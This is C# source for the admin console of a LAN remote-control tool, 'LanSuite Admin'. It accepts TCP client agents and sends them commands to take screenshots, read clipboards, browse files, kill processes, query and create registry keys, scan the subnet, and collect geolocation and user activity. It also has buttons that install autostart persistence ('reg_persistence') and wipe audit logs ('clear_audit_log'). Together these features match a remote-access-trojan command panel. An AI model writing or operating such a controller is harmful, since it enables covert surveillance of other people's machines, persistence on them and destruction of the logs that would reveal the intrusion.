using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;
using LanSuite.Shared;

namespace LanSuite.Admin;

public class MainForm : Form
{
    private const int ListenPort = 50000;
    private const int BroadcastPort = 50001;
    private TcpListener? _listener;
    private UdpClient? _udp;
    private readonly Dictionary<string, ClientSession> _clients = new();
    private CancellationTokenSource? _cts = new();
    private Thread? _acceptThread, _broadcastThread;

    private StatusStrip? _statusStrip;
    private ToolStripStatusLabel? _lblStatus, _lblDevices;
    private ToolStripTextBox? _txtCmd;
    private TabControl? _tc;

    public MainForm()
    {
        Text = "LanSuite Admin - 局域网远程管理";
        Size = new Size(1100, 750);
        MinimumSize = new Size(800, 500);
        Font = new Font("Microsoft YaHei UI", 9F);
        BackColor = Color.FromArgb(250, 250, 252);
        Load += MainForm_Load;
        BuildUI();
        Extensions.SetMainForm(this);
    }

    void BuildUI()
    {
        _tc = new TabControl { Dock = DockStyle.Fill, Font = new Font("Microsoft YaHei UI", 9F) };
        _tc.TabPages.Add(CreateTabPage("设备列表", CreateDevicePanel()));
        _tc.TabPages.Add(CreateTabPage("进程管理", CreateProcessPanel()));
        _tc.TabPages.Add(CreateTabPage("文件管理", CreateFilePanel()));
        _tc.TabPages.Add(CreateTabPage("远程桌面", CreateDesktopPanel()));
        _tc.TabPages.Add(CreateTabPage("剪贴板/TTS", CreateClipboardPanel()));
        _tc.TabPages.Add(CreateTabPage("系统控制", CreateSystemPanel()));
        _tc.TabPages.Add(CreateTabPage("注册表", CreateRegistryPanel()));
        _tc.TabPages.Add(CreateTabPage("网络", CreateNetworkPanel()));
        _tc.TabPages.Add(CreateTabPage("日志", CreateLogPanel()));

        _statusStrip = new StatusStrip();
        _lblStatus = new ToolStripStatusLabel { Text = "未连接" };
        _lblDevices = new ToolStripStatusLabel { Text = "设备: 0" };
        _txtCmd = new ToolStripTextBox { Width = 400, Text = "get_system_info" };
        var btnSend = new ToolStripButton("发送") { Name = "btnSend" };
        var btnBroadcast = new ToolStripButton("广播") { Name = "btnBroadcast" };

        _statusStrip!.Items.AddRange(new ToolStripItem[] { _lblStatus!, new ToolStripSeparator(), _lblDevices!, new ToolStripSeparator(), _txtCmd!, btnSend, btnBroadcast });
        btnSend.Click += (s, e) => SendSelectedCommand(_txtCmd!.Text);
        btnBroadcast.Click += (s, e) => BroadcastCommand(_txtCmd!.Text);
        _txtCmd!.KeyDown += (s, e) => { if (e.KeyCode == Keys.Enter) SendSelectedCommand(_txtCmd!.Text); };

        var panel = new TableLayoutPanel { Dock = DockStyle.Fill, RowCount = 1, ColumnCount = 1 };
        panel.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
        panel.Controls.Add(_tc!, 0, 0);
        panel.SetColumnSpan(_tc!, 1);
        panel.SetRowSpan(_tc!, 1);

        Controls.Add(panel);
        Controls.Add(_statusStrip!);
        _statusStrip!.BringToFront();
    }

    TabPage CreateTabPage(string text, Control content)
    {
        var tp = new TabPage(text) { Padding = new Padding(6) };
        var p = new Panel { Dock = DockStyle.Fill, Padding = new Padding(4) };
        p.Controls.Add(content);
        tp.Controls.Add(p);
        return tp;
    }

    async void MainForm_Load(object? sender, EventArgs e)
    {
        StartServer();
        await Task.Delay(500);
        LogMessage("服务器已启动，等待客户端连接...");
    }

    void StartServer()
    {
        _cts = new CancellationTokenSource();
        _listener = new TcpListener(IPAddress.Any, ListenPort);
        _listener.Start();
        _acceptThread = new Thread(() => AcceptLoop(_cts!.Token)) { IsBackground = true };
        _acceptThread.Start();
        _udp = new UdpClient(BroadcastPort);
        _broadcastThread = new Thread(() => BroadcastLoop(_cts.Token)) { IsBackground = true };
        _broadcastThread.Start();
    }

    async void AcceptLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested && _listener != null)
        {
            try
            {
                var tcp = await _listener.AcceptTcpClientAsync(ct);
                tcp.NoDelay = true;
                var session = new ClientSession(tcp);
                _clients[session.DeviceId] = session;
                UpdateDeviceList();
                LogMessage($"新客户端: {session.DeviceId} @ {tcp.Client.RemoteEndPoint}");
                _ = session.HandleMessagesAsync(ct);
            }
            catch (OperationCanceledException) { break; }
            catch (Exception ex) { LogMessage($"Accept error: {ex.Message}"); }
        }
    }

    void BroadcastLoop(CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            try
            {
                var result = _udp!.Receive(ref _broadcastEp);
                var text = Encoding.UTF8.GetString(result);
                if (text.StartsWith("LANCLIENT_BEACON:"))
                {
                    var parts = text.Substring(17).Split(':');
                    if (parts.Length >= 3 && !_clients.ContainsKey(parts[0]))
                        LogMessage($"发现设备: {parts[0]} @ {parts[1]}:{parts[2]}");
                }
            }
            catch { break; }
        }
    }

    private IPEndPoint _broadcastEp = new(IPAddress.Any, 0);

    Panel CreateDevicePanel()
    {
        var pnl = new FlowLayoutPanel { FlowDirection = FlowDirection.TopDown, AutoScroll = true };

        var btnRefresh = new Button { Text = "刷新列表", Dock = DockStyle.Top, Height = 36, Margin = new Padding(0, 0, 0, 8) };
        btnRefresh.Click += (s, e) => UpdateDeviceList();
        pnl.Controls.Add(btnRefresh);

        var btnScan = new Button { Text = "网络扫描", Dock = DockStyle.Top, Height = 36, Margin = new Padding(0, 0, 0, 8) };
        btnScan.Click += async (s, e) => { await ScanNetwork(pnl); };
        pnl.Controls.Add(btnScan);

        var lv = new ListView
        {
            Dock = DockStyle.Fill,
            View = View.Details,
            FullRowSelect = true,
            GridLines = true,
            Columns = { "设备ID", "IP地址", "状态", "最后活跃" }
        };
        lv.Name = "lvClients";
        pnl.Controls.Add(lv);

        var cmdBox = new TextBox { Dock = DockStyle.Top, Height = 30, Text = "get_system_info", ReadOnly = true };
        pnl.Controls.Add(cmdBox);

        var btnSend = new Button { Text = "发送命令", Dock = DockStyle.Top, Height = 36, Margin = new Padding(0, 4, 0, 0) };
        btnSend.Click += (s, e) =>
        {
            if (lv.SelectedItems.Count == 0) { MessageBox.Show("请先选择设备", "提示", MessageBoxButtons.OK, MessageBoxIcon.Warning); return; }
            var id = lv.SelectedItems[0].Text;
            SendToClient(id, cmdBox.Text);
        };
        pnl.Controls.Add(btnSend);

        return pnl;
    }

    void UpdateDeviceList()
    {
        var lv = Controls.OfType<ListView>().FirstOrDefault(x => x.Name == "lvClients");
        if (lv == null) return;
        lv.BeginUpdate();
        lv.Items.Clear();
        foreach (var (id, session) in _clients)
        {
            var item = lv.Items.Add(id);
            item.SubItems.Add(session.Endpoint?.ToString() ?? "N/A");
            item.SubItems.Add(session.Channel?.IsConnected == true ? "在线" : "离线");
            item.SubItems.Add(DateTime.Now.ToString("HH:mm:ss"));
        }
        lv.EndUpdate();
        SetDeviceCount(_clients.Count);
    }

    async Task ScanNetwork(Panel pnl)
    {
        var subnet = "192.168.1";
        LogMessage($"开始扫描网段 {subnet}.1-254...");
        var tasks = Enumerable.Range(1, 254).Select(i => Task.Run(async () =>
        {
            try { using var p = new Ping(); var r = await p.SendPingAsync($"{subnet}.{i}", 300); return r.Status == IPStatus.Success ? $"{subnet}.{i}" : null; }
            catch { return null; }
        }));
        var results = (await Task.WhenAll(tasks)).Where(x => x != null).ToList();
        LogMessage($"扫描完成，发现 {results.Count} 台主机");
        if (results.Count > 0)
        {
            var lb = new Label { Text = $"发现: {string.Join(", ", results)}", ForeColor = Color.FromArgb(0, 120, 215), Dock = DockStyle.Top, Height = 24, Margin = new Padding(0, 4, 0, 0) };
            pnl.Controls.Add(lb);
        }
    }

    Panel CreateProcessPanel()
    {
        var pnl = new Panel { Dock = DockStyle.Fill, Padding = new Padding(4) };
        var layout = new TableLayoutPanel { Dock = DockStyle.Fill, ColumnCount = 2, RowCount = 2 };
        layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 70));
        layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 30));
        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 80));
        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 20));

        var lv = new ListView { Dock = DockStyle.Fill, View = View.Details, FullRowSelect = true, GridLines = true };
        lv.Columns.Add("PID", 80); lv.Columns.Add("名称", 200); lv.Columns.Add("内存(MB)", 100);
        layout.Controls.Add(lv, 0, 0);

        var btnRefresh = new Button { Text = "刷新", Dock = DockStyle.Top, Height = 32, Margin = new Padding(0, 0, 0, 4) };
        var txtCmd = new TextBox { Dock = DockStyle.Top, Height = 28, Text = "kill_process" };
        var btnExec = new Button { Text = "执行", Dock = DockStyle.Top, Height = 32, Margin = new Padding(0, 4, 0, 0) };
        var rightPanel = new FlowLayoutPanel { FlowDirection = FlowDirection.TopDown, Controls = { btnRefresh, new Label { Text = "命令:", AutoSize = true }, txtCmd, btnExec } };
        layout.Controls.Add(rightPanel, 1, 0);

        var lblOutput = new TextBox { Dock = DockStyle.Fill, ReadOnly = true, Multiline = true, ScrollBars = ScrollBars.Vertical, Font = new Font("Consolas", 8F) };
        layout.Controls.Add(lblOutput, 0, 1);
        layout.SetColumnSpan(lblOutput, 2);

        btnRefresh.Click += async (s, e) =>
        {
            if (_clients.Count == 0) { MessageBox.Show("无连接设备", "提示"); return; }
            var id = _clients.Keys.First();
            var result = await SendCmdAsync(id, "get_processes");
            if (result != null)
            {
                lv.Items.Clear();
                foreach (var line in result.Split('\n'))
                {
                    var parts = line.Split('|');
                    if (parts.Length >= 3) lv.Items.Add(parts[0]).SubItems.AddRange([parts[1], parts[2]]);
                }
            }
        };
        btnExec.Click += new EventHandler((s, e) =>
        {
            if (lv.SelectedItems.Count == 0) return;
            var pid = lv.SelectedItems[0].Text;
            SendToClient(_clients.Keys.First(), $"{txtCmd.Text} {pid}");
            lblOutput.AppendText($"已发送: {txtCmd.Text} {pid}\n");
        });

        pnl.Controls.Add(layout);
        return pnl;
    }

    Panel CreateFilePanel()
    {
        var pnl = new Panel { Dock = DockStyle.Fill, Padding = new Padding(4) };
        var layout = new TableLayoutPanel { Dock = DockStyle.Fill, ColumnCount = 1, RowCount = 3 };
        layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 30));
        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
        layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 120));

        var pathBar = new TextBox { Dock = DockStyle.Fill, Text = "C:\\" };
        var btnGo = new Button { Text = "浏览", Dock = DockStyle.Left, Width = 60 };
        var barPanel = new Panel { Dock = DockStyle.Top, Height = 30 };
        barPanel.Controls.Add(pathBar); barPanel.Controls.Add(btnGo);
        layout.Controls.Add(barPanel, 0, 0);

        var lv = new ListView { Dock = DockStyle.Fill, View = View.Details, FullRowSelect = true, GridLines = true };
        lv.Columns.Add("类型", 50); lv.Columns.Add("名称", 300); lv.Columns.Add("大小", 100);
        layout.Controls.Add(lv, 0, 1);

        var outBox = new TextBox { Dock = DockStyle.Fill, ReadOnly = true, Multiline = true, ScrollBars = ScrollBars.Vertical, Font = new Font("Consolas", 8F) };
        layout.Controls.Add(outBox, 0, 2);

        btnGo.Click += async (s, e) =>
        {
            if (_clients.Count == 0) return;
            var id = _clients.Keys.First();
            var result = await SendCmdAsync(id, $"get_dir {pathBar.Text}");
            outBox.AppendText($"\n--- {pathBar.Text} ---\n");
            if (result != null)
            {
                lv.Items.Clear();
                foreach (var line in result.Split('\n'))
                {
                    var parts = line.Split('|');
                    if (parts.Length >= 3)
                    {
                        var item = lv.Items.Add(parts[0] == "D" ? "文件夹" : "文件");
                        item.SubItems.AddRange([parts[1], parts[2]]);
                        outBox.AppendText($"{parts[0]} | {parts[1]} | {parts[2]}\n");
                    }
                }
            }
        };
        pnl.Controls.Add(layout);
        return pnl;
    }

    Panel CreateDesktopPanel()
    {
        var pnl = new Panel { Dock = DockStyle.Fill, Padding = new Padding(4) };
        var layout = new TableLayoutPanel { Dock = DockStyle.Fill, ColumnCount = 2, RowCount = 1 };
        layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 75));
        layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 25));

        var picScreen = new PictureBox { Dock = DockStyle.Fill, BackColor = Color.Black, BorderStyle = BorderStyle.FixedSingle, SizeMode = PictureBoxSizeMode.Zoom };
        layout.Controls.Add(picScreen, 0, 0);

        var ctrlPanel = new FlowLayoutPanel { FlowDirection = FlowDirection.TopDown, AutoScroll = true, Padding = new Padding(4) };
        var addBtn = (string text, Action action) =>
        {
            var b = new Button { Text = text, Dock = DockStyle.Top, Height = 36, Margin = new Padding(0, 2, 0, 2) };
            b.Click += (s, e) => action();
            ctrlPanel.Controls.Add(b);
        };

        addBtn("截图", async () =>
        {
            if (_clients.Count == 0) return;
            var result = await SendCmdAsync(_clients.Keys.First(), "screenshots");
            if (result != null && result.Contains("screenshot_"))
            {
                var path = result.Split('|')[0];
                if (File.Exists(path)) picScreen.Image = Image.FromFile(path);
            }
        });
        addBtn("窗口列表", () => SendToClient(_clients.Keys.FirstOrDefault() ?? "", "get_windows"));
        addBtn("最小化所有", () => SendToClient(_clients.Keys.FirstOrDefault() ?? "", "minimize_windows"));
        addBtn("锁屏", () => SendToClient(_clients.Keys.FirstOrDefault() ?? "", "lock_screen"));

        layout.Controls.Add(ctrlPanel, 1, 0);
        pnl.Controls.Add(layout);
        return pnl;
    }

    Panel CreateClipboardPanel()
    {
        var pnl = new Panel { Dock = DockStyle.Fill, Padding = new Padding(4) };
        var layout = new TableLayoutPanel { Dock = DockStyle.Fill, ColumnCount = 2, RowCount = 2 };
        layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 50));
        layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 50));
        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 50));
        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 50));

        var lblClip = new Label { Text = "剪贴板内容:", AutoSize = true };
        var rtbClip = new RichTextBox { Dock = DockStyle.Fill, ReadOnly = true, Font = new Font("Consolas", 9F) };
        var btnClipGet = new Button { Text = "获取剪贴板", Dock = DockStyle.Top, Height = 32 };
        var clipPanel = new FlowLayoutPanel { FlowDirection = FlowDirection.TopDown, Controls = { lblClip, btnClipGet, rtbClip } };
        layout.Controls.Add(clipPanel, 0, 0);

        var lblTts = new Label { Text = "TTS 语音:", AutoSize = true };
        var txtTts = new TextBox { Dock = DockStyle.Top, Height = 30 };
        var btnTts = new Button { Text = "播放语音", Dock = DockStyle.Top, Height = 32 };
        var ttsPanel = new FlowLayoutPanel { FlowDirection = FlowDirection.TopDown, Controls = { lblTts, txtTts, btnTts } };
        layout.Controls.Add(ttsPanel, 1, 0);

        var lblLog = new Label { Text = "操作日志:", AutoSize = true };
        var rtbLog = new RichTextBox { Dock = DockStyle.Fill, ReadOnly = true, Font = new Font("Consolas", 8F) };
        var logPanel = new FlowLayoutPanel { FlowDirection = FlowDirection.TopDown, Controls = { lblLog, rtbLog } };
        layout.SetColumnSpan(logPanel, 2);
        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 35));
        layout.Controls.Add(logPanel, 0, 1);

        btnClipGet.Click += async (s, e) =>
        {
            if (_clients.Count == 0) return;
            var result = await SendCmdAsync(_clients.Keys.First(), "clipboard_get");
            if (result != null) { rtbClip.Text = result; rtbLog.AppendText($"[{DateTime.Now:HH:mm:ss}] 剪贴板获取成功\n"); }
        };
        btnTts.Click += async (s, e) =>
        {
            if (_clients.Count == 0 || string.IsNullOrEmpty(txtTts.Text)) return;
            var result = await SendCmdAsync(_clients.Keys.First(), $"tts_speak \"{txtTts.Text}\"");
            if (result != null) rtbLog.AppendText($"[{DateTime.Now:HH:mm:ss}] TTS: {result}\n");
        };

        pnl.Controls.Add(layout);
        return pnl;
    }

    Panel CreateSystemPanel()
    {
        var pnl = new Panel { Dock = DockStyle.Fill, Padding = new Padding(4) };
        var flow = new FlowLayoutPanel { FlowDirection = FlowDirection.TopDown, AutoScroll = true, Dock = DockStyle.Fill };

        var addBtn = (string text, string cmd, Color? color = null) =>
        {
            var b = new Button { Text = text, Dock = DockStyle.Top, Height = 40, Margin = new Padding(0, 2, 0, 2), ForeColor = color ?? Color.FromArgb(30, 30, 30) };
            b.Click += async (s, e) =>
            {
                if (_clients.Count == 0) { MessageBox.Show("无连接设备", "提示"); return; }
                var result = await SendCmdAsync(_clients.Keys.First(), cmd);
                if (result != null) MessageBox.Show(result, text, MessageBoxButtons.OK, MessageBoxIcon.Information);
            };
            flow.Controls.Add(b);
        };

        addBtn("系统信息", "get_system_info");
        addBtn("TCP连接", "get_tcp_connections");
        addBtn("磁盘信息", "get_drives");
        addBtn("窗口列表", "get_windows");
        addBtn("获取时间", "get_time");
        addBtn("地理位置", "get_geo");
        addBtn("审计日志", "get_audit_log");
        addBtn("锁屏", "lock_screen");
        addBtn("代理设置", "get_proxy");
        addBtn("用户活动", "get_user_activity");
        addBtn("开机自启", "reg_persistence");
        addBtn("清空审计日志", "clear_audit_log");

        pnl.Controls.Add(flow);
        return pnl;
    }

    Panel CreateRegistryPanel()
    {
        var pnl = new Panel { Dock = DockStyle.Fill, Padding = new Padding(4) };
        var layout = new TableLayoutPanel { Dock = DockStyle.Fill, ColumnCount = 2, RowCount = 1 };
        layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 60));
        layout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 40));

        var grpQuery = new GroupBox { Text = "查询", Dock = DockStyle.Fill, Padding = new Padding(8) };
        var layout2 = new TableLayoutPanel { Dock = DockStyle.Fill, ColumnCount = 1, RowCount = 4 };
        layout2.RowStyles.Add(new RowStyle(SizeType.Absolute, 30));
        layout2.RowStyles.Add(new RowStyle(SizeType.Absolute, 30));
        layout2.RowStyles.Add(new RowStyle(SizeType.Percent, 100));
        layout2.RowStyles.Add(new RowStyle(SizeType.Absolute, 36));

        var cmbHKey = new ComboBox { Dock = DockStyle.Fill, DropDownStyle = ComboBoxStyle.DropDown };
        cmbHKey.Items.AddRange(["HKCR(2147483650)", "HKCU(2147483651)", "HKLM(2147483652)", "HKU(2147483653)", "HKCC(2147483654)"]);
        cmbHKey.SelectedIndex = 2;
        layout2.Controls.Add(cmbHKey, 0, 0);

        var txtPath = new TextBox { Dock = DockStyle.Fill, Text = "SOFTWARE" };
        layout2.Controls.Add(txtPath, 0, 1);

        var rtbResult = new RichTextBox { Dock = DockStyle.Fill, ReadOnly = true, Font = new Font("Consolas", 8F) };
        layout2.Controls.Add(rtbResult, 0, 2);

        var btnQuery = new Button { Text = "查询", Dock = DockStyle.Top, Height = 32 };
        btnQuery.Click += async (s, e) =>
        {
            if (_clients.Count == 0) return;
            var hkey = cmbHKey.Text.Split('(')[1].TrimEnd(')');
            var result = await SendCmdAsync(_clients.Keys.First(), $"reg_query {hkey} {txtPath.Text}");
            if (result != null) rtbResult.Text = result;
        };
        layout2.Controls.Add(btnQuery, 0, 3);
        grpQuery.Controls.Add(layout2);
        layout.Controls.Add(grpQuery, 0, 0);

        var grpActions = new GroupBox { Text = "操作", Dock = DockStyle.Fill, Padding = new Padding(8) };
        var flow = new FlowLayoutPanel { FlowDirection = FlowDirection.TopDown, Dock = DockStyle.Fill, AutoScroll = true };
        var addAction = (string text, string cmd) =>
        {
            var b = new Button { Text = text, Dock = DockStyle.Top, Height = 36, Margin = new Padding(0, 2, 0, 2) };
            b.Click += async (s, e) =>
            {
                if (_clients.Count == 0) return;
                var r = await SendCmdAsync(_clients.Keys.First(), cmd);
                if (r != null) MessageBox.Show(r, text);
            };
            flow.Controls.Add(b);
        };
        addAction("列出子键", $"reg_list {(cmbHKey.Text.StartsWith("HKLM") ? "2147483652" : "2147483651")} {txtPath.Text}");
        addAction("创建键", $"reg_create_key {(cmbHKey.Text.StartsWith("HKLM") ? "2147483652" : "2147483651")} {txtPath.Text}\\NewKey");
        grpActions.Controls.Add(flow);
        layout.Controls.Add(grpActions, 1, 0);

        pnl.Controls.Add(layout);
        return pnl;
    }

    Panel CreateNetworkPanel()
    {
        var pnl = new Panel { Dock = DockStyle.Fill, Padding = new Padding(4) };
        var layout = new TableLayoutPanel { Dock = DockStyle.Fill, ColumnCount = 1, RowCount = 3 };
        layout.RowStyles.Add(new RowStyle(SizeType.Absolute, 36));
        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 60));
        layout.RowStyles.Add(new RowStyle(SizeType.Percent, 40));

        var flow = new FlowLayoutPanel { Dock = DockStyle.Top, Height = 32, FlowDirection = FlowDirection.LeftToRight };
        var btnScan = new Button { Text = "网络扫描", Height = 28, Margin = new Padding(0, 0, 8, 0) };
        var btnConns = new Button { Text = "TCP连接", Height = 28, Margin = new Padding(0, 0, 8, 0) };
        var btnProxy = new Button { Text = "代理设置", Height = 28 };
        flow.Controls.AddRange([btnScan, btnConns, btnProxy]);
        layout.Controls.Add(flow, 0, 0);

        var rtbNet = new RichTextBox { Dock = DockStyle.Fill, ReadOnly = true, Font = new Font("Consolas", 9F) };
        layout.Controls.Add(rtbNet, 0, 1);

        var rtbLog = new RichTextBox { Dock = DockStyle.Fill, ReadOnly = true, Font = new Font("Consolas", 8F) };
        layout.Controls.Add(rtbLog, 0, 2);

        btnScan.Click += async (s, e) =>
        {
            if (_clients.Count == 0) return;
            rtbNet.AppendText("正在扫描 192.168.1.1-254...\n");
            var result = await SendCmdAsync(_clients.Keys.First(), "network_scan 192.168.1 1 254");
            if (result != null) rtbNet.AppendText(result + "\n");
        };
        btnConns.Click += async (s, e) =>
        {
            if (_clients.Count == 0) return;
            var result = await SendCmdAsync(_clients.Keys.First(), "get_tcp_connections");
            if (result != null) rtbNet.Text = result;
        };
        btnProxy.Click += async (s, e) =>
        {
            if (_clients.Count == 0) return;
            var result = await SendCmdAsync(_clients.Keys.First(), "get_proxy");
            if (result != null) MessageBox.Show(result, "代理设置");
        };

        pnl.Controls.Add(layout);
        return pnl;
    }

    Panel CreateLogPanel()
    {
        var pnl = new Panel { Dock = DockStyle.Fill, Padding = new Padding(4) };
        var rtb = new RichTextBox { Dock = DockStyle.Fill, ReadOnly = true, Font = new Font("Consolas", 9F) };
        rtb.Name = "rtbLog";
        pnl.Controls.Add(rtb);
        return pnl;
    }

    void SendSelectedCommand(string cmd)
    {
        var lv = Controls.OfType<ListView>().FirstOrDefault(x => x.Name == "lvClients");
        if (lv != null && lv.SelectedItems.Count > 0)
        {
            SendToClient(lv.SelectedItems[0].Text, cmd);
        }
        else
        {
            BroadcastCommand(cmd);
        }
    }

    async Task<string?> SendCmdAsync(string deviceId, string cmd)
    {
        if (!_clients.TryGetValue(deviceId, out var session) || session.Channel == null) return null;
        session.Channel.Send(new MessagePack(FrameTypes.Cmd, $"CMD:{cmd}"));
        await Task.Delay(2000);
        return session.LastResponse;
    }

    void SendToClient(string deviceId, string command)
    {
        if (_clients.TryGetValue(deviceId, out var session) && session.Channel != null)
        {
            session.Channel.Send(new MessagePack(FrameTypes.Cmd, $"CMD:{command}"));
            LogMessage($"已发送: {command} -> {deviceId}");
        }
    }

    void BroadcastCommand(string command)
    {
        foreach (var session in _clients.Values)
            session.Channel?.Send(new MessagePack(FrameTypes.Cmd, $"CMD:*:{command}"));
        LogMessage($"广播命令: {command}");
    }

    void LogMessage(string msg)
    {
        var line = $"[{DateTime.Now:HH:mm:ss}] {msg}";
        var rtb = Controls.OfType<RichTextBox>().FirstOrDefault(x => x.Name == "rtbLog");
        if (rtb != null && rtb.InvokeRequired) rtb.Invoke(new Action(() => rtb.AppendText(line + "\n")));
        else rtb?.AppendText(line + "\n");
        File.AppendAllText(Path.Combine(Path.GetTempPath(), "LanSuite_admin.log"), line + "\n", Encoding.UTF8);
    }

    void SetDeviceCount(int count)
    {
        _lblDevices?.SetText($"设备: {count}");
        _lblStatus?.SetText(count > 0 ? $"已连接 {count} 台设备" : "未连接");
        if (_lblStatus != null) _lblStatus.ForeColor = count > 0 ? Color.FromArgb(0, 150, 0) : Color.FromArgb(200, 0, 0);
    }

    protected override void OnFormClosing(FormClosingEventArgs e)
    {
        _cts?.Cancel();
        _listener?.Stop();
        _udp?.Close();
        base.OnFormClosing(e);
    }
}

static class Extensions
{
    private static Form? _mainForm;
    public static void SetMainForm(Form form) { _mainForm = form; }

    public static void SetText(this ToolStripStatusLabel lbl, string text)
    {
        if (_mainForm != null && _mainForm.InvokeRequired)
            _mainForm.Invoke(new Action(() => lbl.Text = text));
        else
            lbl.Text = text;
    }
}

class ClientSession
{
    public string DeviceId { get; set; } = "unknown";
    public MessageChannel? Channel { get; private set; }
    public IPEndPoint? Endpoint { get; private set; }
    public string? LastResponse { get; set; }
    private readonly TcpClient _tcp;

    public ClientSession(TcpClient tcp)
    {
        _tcp = tcp;
        Endpoint = (IPEndPoint)tcp.Client.RemoteEndPoint!;
    }

    public async Task HandleMessagesAsync(CancellationToken ct)
    {
        try
        {
            Channel = new MessageChannel(_tcp);
            Channel.OnMessage += OnMessage;
            while (!ct.IsCancellationRequested && Channel.IsConnected) await Task.Delay(500, ct);
        }
        catch { }
        finally { Channel?.Close(); }
    }

    void OnMessage(MessagePack msg)
    {
        var text = msg.Text;
        if (text.StartsWith("HELLO:") || text.StartsWith("ACK:"))
        {
            DeviceId = text.StartsWith("ACK:") ? text.Substring(4) : text.Substring(6);
        }
        else if (text.StartsWith("DATA:"))
        {
            var parts = text.Substring(5).Split(':', 3);
            if (parts.Length >= 2) LastResponse = parts.Length > 2 ? parts[2] : parts[1];
        }
    }
}

static class Program
{
    [STAThread]
    static void Main()
    {
        ApplicationConfiguration.Initialize();
        Application.Run(new MainForm());
    }
}
